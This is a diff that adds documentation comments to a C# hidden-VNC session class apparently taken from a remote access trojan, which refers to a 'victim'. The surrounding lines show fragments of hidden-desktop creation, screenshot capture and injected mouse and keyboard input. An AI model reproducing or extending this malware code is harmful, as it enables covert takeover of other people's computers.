@@ -31,7 +31,6 @@ namespace winClient48
 
         private Size m_Resolution = new Size(0, 0);
 
-
         public clsfnHvncSession(clsVictim victim, string szDesktopName)
         {
             m_victim = victim;
@@ -43,6 +42,10 @@ namespace winClient48
                 throw new Exception("Create window failed.");
         }
 
+        /// <summary>
+        /// Get resolution of the current monitor.
+        /// </summary>
+        /// <returns></returns>
         private Size fnGetResolution()
         {
             int nWidth = WinAPI.GetSystemMetrics(0);
@@ -51,6 +54,13 @@ namespace winClient48
             return new Size(nWidth, nHeight);
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="hWndParent"></param>
+        /// <param name="x"></param>
+        /// <param name="y"></param>
+        /// <returns></returns>
         private IntPtr GetDeepestChild(IntPtr hWndParent, int x, int y)
         {
             Point pt = new Point(x, y);
@@ -67,6 +77,10 @@ namespace winClient48
             return hWndParent;
         }
 
+        /// <summary>
+        /// Create process.
+        /// </summary>
+        /// <param name="szExe"></param>
         public void fnCreate(string szExe = "explorer.exe /separate")
         {
             WinAPI.STARTUPINFO si = new WinAPI.STARTUPINFO();
@@ -100,6 +114,10 @@ namespace winClient48
             }
         }
 
+        /// <summary>
+        /// Start HVNC
+        /// </summary>
+        /// <param name="nDelay"></param>
         public void fnStart(int nDelay)
         {
             while (m_bRunning)
@@ -120,6 +138,10 @@ namespace winClient48
             }
         }
 
+        /// <summary>
+        /// Do screenshot via HVNC.
+        /// </summary>
+        /// <returns></returns>
         public Bitmap fnGetScreenshot()
         {
             WinAPI.SetThreadDesktop(m_hDesktop);
@@ -157,6 +179,12 @@ namespace winClient48
             return bmp;
         }
 
+        /// <summary>
+        /// Input and process mouse movement.
+        /// </summary>
+        /// <param name="type"></param>
+        /// <param name="x"></param>
+        /// <param name="y"></param>
         public void fnHandleMouseInput(string type, int x, int y)
         {
             WinAPI.SetThreadDesktop(m_hDesktop);
@@ -216,6 +244,11 @@ namespace winClient48
             }
         }
 
+        /// <summary>
+        /// Input and process keyboard char.
+        /// </summary>
+        /// <param name="action"></param>
+        /// <param name="vk"></param>
         public void fnHandleKeyboardInput(string action, int vk)
         {
             WinAPI.SetThreadDesktop(m_hDesktop);
